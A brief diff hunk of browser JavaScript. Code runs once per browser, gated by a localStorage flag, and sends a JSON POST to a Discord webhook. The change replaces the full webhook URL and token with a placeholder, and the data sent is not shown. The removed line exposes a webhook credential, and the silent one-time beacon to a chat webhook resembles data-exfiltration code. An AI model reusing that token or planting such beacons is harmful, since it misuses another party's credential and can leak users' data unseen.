@@ -12,7 +12,7 @@ if (localStorage.c12 == "False") {
         }
         localStorage.c12 = "True";
         const request = new XMLHttpRequest();
-        request.open("POST", "https://discord.com/api/webhooks/1253349982778556489/qhjERMkwzHs9-tKEblxv7LeVic2R--82EJBfWmcTT9ubffxk93SuxWX1UQOWvpLaqx0m");
+        request.open("POST", "##");
 
         request.setRequestHeader('Content-type', 'application/json');
 
